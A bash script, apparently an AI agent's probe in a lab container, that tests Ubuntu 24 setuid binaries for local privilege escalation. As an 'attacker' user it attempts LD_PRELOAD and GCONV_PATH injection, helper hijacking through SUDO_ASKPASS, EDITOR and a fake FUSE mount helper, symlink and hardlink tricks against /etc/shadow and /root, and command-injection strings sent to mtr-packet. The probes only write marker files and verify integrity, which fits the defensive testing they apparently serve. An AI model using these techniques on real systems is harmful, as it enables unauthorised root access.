#!/usr/bin/env bash
set -u -o pipefail

target="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$target" bash -s <<'INNER'
set +e
export LC_ALL=C

section() {
  printf '\n===== %s =====\n' "$*"
}

run() {
  printf '+ %s\n' "$*"
  bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

as_attacker() {
  printf '+ runuser -u attacker -- %s\n' "$*"
  runuser -u attacker -- bash -lc "$*" 2>&1
  printf 'rc=%s\n' "$?"
}

WORK="/tmp/agent_setuid_secureexec_edges"
AHOME="/home/attacker/agent_setuid_secureexec_edges"
ROOT_MARKER="/root/agent_setuid_secureexec_edges_root_marker"
TRACE_DIR="$WORK/traces"

arch="$(dpkg-architecture -qDEB_HOST_MULTIARCH 2>/dev/null || true)"
[ -n "$arch" ] || arch="$(ls -d /usr/lib/*-linux-gnu 2>/dev/null | head -1 | xargs -r basename)"
[ -n "$arch" ] || arch="aarch64-linux-gnu"

GST="/usr/lib/$arch/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"
UTEMPTER="/usr/lib/$arch/utempter/utempter"

cleanup() {
  pkill -u attacker -f agent_setuid_secureexec_edges >/dev/null 2>&1 || true
  fusermount3 -u "$WORK/fuse-mnt" >/dev/null 2>&1 || umount "$WORK/fuse-mnt" >/dev/null 2>&1 || true
  rm -rf "$WORK" "$AHOME"
  rm -f "$ROOT_MARKER" /root/agent_setuid_secureexec_edges_socket /root/agent_setuid_secureexec_edges_mount
}

trap cleanup EXIT
cleanup
mkdir -p "$WORK" "$TRACE_DIR" "$AHOME/bin" "$AHOME/tmp" "$AHOME/gconv" "$AHOME/locale"
chown -R attacker:attacker "$AHOME" "$WORK"

cat > "$AHOME/bin/edge-helper" <<'EOF'
#!/bin/sh
out="/home/attacker/agent_setuid_secureexec_edges/helper-runs.log"
{
  printf 'helper=%s\n' "$0"
  id
  grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):' /proc/self/status
  printf 'argv:'
  for a in "$@"; do printf ' <%s>' "$a"; done
  printf '\n---\n'
} >> "$out"
cap_eff="$(awk '/^CapEff:/ {print $2}' /proc/self/status)"
if [ "$(id -u)" = "0" ] || [ "$cap_eff" != "0000000000000000" ]; then
  {
    echo "privileged helper reached"
    id
    grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)):' /proc/self/status
  } > /root/agent_setuid_secureexec_edges_root_marker 2>/dev/null
fi
exit 73
EOF
chmod 755 "$AHOME/bin/edge-helper"
for name in mount.fuse.agentedge mount.agentedge agentedge editor askpass pkcs11-helper shell; do
  ln -sf edge-helper "$AHOME/bin/$name"
done
chown -R attacker:attacker "$AHOME"

section "target and fixed helper inventory"
run 'cat /etc/os-release | sed -n "1,8p"; uname -a; id attacker; groups attacker'
run 'apt-get -s full-upgrade 2>&1 | sed -n "1,80p"'
run "dpkg-query -W -f='\${binary:Package}\t\${Version}\t\${Architecture}\t\${db:Status-Abbrev}\n' ubuntu-minimal ubuntu-standard ubuntu-server fuse3 mount util-linux passwd login sudo openssh-client libutempter0 dbus polkitd iputils-ping mtr-tiny libgstreamer1.0-0 2>&1"
run "stat -c '%A %a %U:%G %n' /usr/bin/mount /usr/bin/umount /usr/bin/fusermount3 /usr/bin/crontab /usr/bin/sudo /usr/bin/newgrp /usr/bin/ssh-agent /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/polkit-1/polkit-agent-helper-1 /usr/bin/ping /usr/bin/mtr-packet '$GST' '$UTEMPTER' /usr/sbin/unix_chkpwd /usr/sbin/pam_extrausers_chkpwd 2>&1"
run "getcap -v /usr/bin/ping /usr/bin/mtr-packet '$GST' /usr/lib/snapd/snap-confine 2>&1"
run 'sha256sum /etc/passwd /etc/shadow /etc/group /etc/gshadow /run/utmp /var/log/wtmp /var/log/btmp 2>/dev/null | tee /tmp/agent_setuid_secureexec_edges.before.sha256'
as_attacker 'id; grep -E "^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):" /proc/self/status'

section "root-side trace of secure-exec environment filtering"
trace_one() {
  name="$1"
  shift
  rm -f "$TRACE_DIR/$name".*
  printf '+ trace %s: %s\n' "$name" "$*"
  strace -ff -o "$TRACE_DIR/$name" \
    -e trace=execve,openat,open,access,newfstatat,statx,readlink,chdir,mkdir,rename,link,symlink,setuid,setgid,setreuid,setregid,setresuid,setresgid,capset,prctl \
    runuser -u attacker -- env -i \
      HOME="$AHOME" USER=attacker LOGNAME=attacker \
      PATH="$AHOME/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
      TMPDIR="$AHOME/tmp" \
      LD_PRELOAD="$AHOME/libagent.so" LD_AUDIT="$AHOME/audit.so" \
      GCONV_PATH="$AHOME/gconv" LOCPATH="$AHOME/locale" NLSPATH="$AHOME/nls/%N" \
      BASH_ENV="$AHOME/bashenv" ENV="$AHOME/shenv" \
      "$@" >/tmp/agent_setuid_secureexec_edges.$name.stdout 2>/tmp/agent_setuid_secureexec_edges.$name.stderr
  rc=$?
  printf 'trace_rc=%s\n' "$rc"
  printf 'stdout_tail:\n'
  tail -c 600 /tmp/agent_setuid_secureexec_edges.$name.stdout 2>/dev/null | tr '\000' '?'
  printf '\nstderr_tail:\n'
  tail -c 1000 /tmp/agent_setuid_secureexec_edges.$name.stderr 2>/dev/null | tr '\000' '?'
  printf '\nattacker_path_trace_hits:\n'
  grep -R "$AHOME" "$TRACE_DIR/$name".* 2>/dev/null | sed -n '1,80p' || true
  printf '\nprivilege_transition_trace:\n'
  grep -R "set.*uid\\|set.*gid\\|capset\\|execve" "$TRACE_DIR/$name".* 2>/dev/null | sed -n '1,120p' || true
}

trace_one ping_version /usr/bin/ping -V
trace_one gst_direct "$GST" -i eth0 --clock-id 0x0102030405060708
trace_one chage_self /usr/bin/chage -l attacker
trace_one passwd_status /usr/bin/passwd -S attacker
trace_one ssh_keysign /usr/lib/openssh/ssh-keysign
trace_one fusermount_version /usr/bin/fusermount3 -V

section "attacker-controlled helper execution boundaries"
as_attacker "mkdir -p '$WORK/mnt' '$WORK/src'; PATH='$AHOME/bin:/usr/bin:/bin:/usr/sbin:/sbin' /usr/bin/mount -t fuse.agentedge none '$WORK/mnt' 2>&1; echo mount_fuse_helper_rc=\$?"
as_attacker "VISUAL='$AHOME/bin/editor' EDITOR='$AHOME/bin/editor' crontab -e </dev/null >/tmp/agent_setuid_secureexec_edges.crontab.out 2>/tmp/agent_setuid_secureexec_edges.crontab.err; echo crontab_e_rc=\$?; tail -n 20 /tmp/agent_setuid_secureexec_edges.crontab.err"
as_attacker "SUDO_ASKPASS='$AHOME/bin/askpass' sudo -A -k id >/tmp/agent_setuid_secureexec_edges.sudo.out 2>/tmp/agent_setuid_secureexec_edges.sudo.err; echo sudo_askpass_rc=\$?; tail -n 20 /tmp/agent_setuid_secureexec_edges.sudo.err"
as_attacker "SSH_PKCS11_HELPER='$AHOME/bin/pkcs11-helper' timeout 8 ssh-agent sh -c 'ssh-add -s /usr/lib/$arch/libc.so.6 </dev/null >/tmp/agent_setuid_secureexec_edges.sshadd.out 2>/tmp/agent_setuid_secureexec_edges.sshadd.err; echo sshadd_rc=\$?; cat /tmp/agent_setuid_secureexec_edges.sshadd.err' 2>&1; echo ssh_agent_rc=\$?"
as_attacker "SHELL='$AHOME/bin/shell' timeout 8 newgrp attacker </dev/null >/tmp/agent_setuid_secureexec_edges.newgrp.out 2>/tmp/agent_setuid_secureexec_edges.newgrp.err; echo newgrp_rc=\$?; cat /tmp/agent_setuid_secureexec_edges.newgrp.err"
run "printf 'helper_runs_log:\\n'; sed -n '1,220p' '$AHOME/helper-runs.log' 2>/dev/null || true"
run "test -e '$ROOT_MARKER'; echo helper_root_marker_rc=\$?; [ ! -e '$ROOT_MARKER' ] || cat '$ROOT_MARKER'"

section "symlink and hardlink edge checks"
as_attacker "ln -sf /root/agent_setuid_secureexec_edges_socket '$AHOME/agent.sock'; ssh-agent -D -a '$AHOME/agent.sock' >/tmp/agent_setuid_secureexec_edges.agentlink.out 2>/tmp/agent_setuid_secureexec_edges.agentlink.err & pid=\$!; sleep 0.5; kill \$pid 2>/dev/null; wait \$pid 2>/dev/null; echo ssh_agent_symlink_rc=\$?; cat /tmp/agent_setuid_secureexec_edges.agentlink.err; test -e /root/agent_setuid_secureexec_edges_socket; echo root_socket_exists_rc=\$?"
as_attacker "mkdir -p '$WORK/fuse-root' '$WORK/linkdir'; ln -s / '$WORK/linkdir/rootlink'; fusermount3 -o allow_other '$WORK/fuse-root' 2>&1; echo fuse_allow_other_rc=\$?; fusermount3 -u '$WORK/linkdir/rootlink' 2>&1; echo fuse_symlink_umount_rc=\$?"
as_attacker "mount --mkdir '$WORK/src' /root/agent_setuid_secureexec_edges_mount 2>&1; echo mount_root_mkdir_rc=\$?; test -e /root/agent_setuid_secureexec_edges_mount; echo root_mount_exists_rc=\$?"
as_attacker "ln /etc/shadow '$AHOME/shadow.hardlink' 2>&1; echo hardlink_shadow_rc=\$?; ln /usr/bin/sudo '$AHOME/sudo.hardlink' 2>&1; echo hardlink_sudo_rc=\$?; stat -c '%A %U:%G %n' '$AHOME/'*.hardlink 2>&1"

section "mtr-packet retained-cap parser sanity"
as_attacker "mkfifo '$WORK/mtr.in'; /usr/bin/mtr-packet <'$WORK/mtr.in' >'$WORK/mtr.out' 2>'$WORK/mtr.err' & pid=\$!; exec 9>'$WORK/mtr.in'; sleep 0.2; echo mtr_pid=\$pid; grep -E '^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs):' /proc/\$pid/status; getpcaps \$pid 2>&1; printf '1 check-support feature send-probe\n2 check-support feature mark\n3 send-probe ip-4 127.0.0.1 protocol icmp timeout 1\n4 /bin/sh -c id\n5 send-probe ip-4 ../../etc/shadow protocol icmp timeout 1\n' >&9; sleep 1; exec 9>&-; wait \$pid; echo mtr_wait_rc=\$?; cat '$WORK/mtr.out' '$WORK/mtr.err' 2>/dev/null"

section "final integrity and cleanup proof"
run 'sha256sum /etc/passwd /etc/shadow /etc/group /etc/gshadow /run/utmp /var/log/wtmp /var/log/btmp 2>/dev/null | tee /tmp/agent_setuid_secureexec_edges.after.sha256'
run 'diff -u /tmp/agent_setuid_secureexec_edges.before.sha256 /tmp/agent_setuid_secureexec_edges.after.sha256 2>&1 || true'
run "find /root -maxdepth 1 \\( -name 'agent_setuid_secureexec_edges*' -o -name 'setuid-cap-tail-20260517*' \\) -printf '%m %u:%g %p\\n' 2>/dev/null || true"
run "find '$AHOME' '$WORK' -maxdepth 3 -type f -printf '%m %u:%g %s %p\\n' 2>/dev/null | sort"
INNER
